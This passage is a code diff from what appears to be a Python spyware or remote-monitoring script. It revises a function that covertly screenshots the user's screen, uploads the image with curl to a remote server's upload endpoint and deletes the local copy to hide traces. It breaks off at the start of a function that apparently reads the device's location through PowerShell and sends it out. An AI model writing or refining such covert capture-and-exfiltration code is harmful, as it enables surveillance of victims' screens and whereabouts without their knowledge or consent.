@@ -11,16 +11,22 @@ import pyautogui
 import random
 def send_screenshot():
     filename = f"{random.randint(100000,999999)}.png"
+    full_path = os.path.abspath(filename)
     screenshot = pyautogui.screenshot()
-    screenshot.save(filename)
-    command = [
+    screenshot.save(full_path)
+    curl_cmd = [
         "curl",
         "-X", "POST",
-        f"{SERVER_URL}/upload",
-        "-F", f"files=@{filename}"
+        "-F", f"files=@{full_path}",
+        f"{SERVER_URL}/upload"
     ]
-    subprocess.run(command, capture_output=True, text=True)
-    os.remove(filename)
+    subprocess.run(
+        curl_cmd,
+        capture_output=True,
+        text=True
+    )
+    if os.path.exists(full_path):
+        os.remove(full_path)
 def get_location_and_send():
     ps_command = r'''
     Add-Type -AssemblyName System.Device
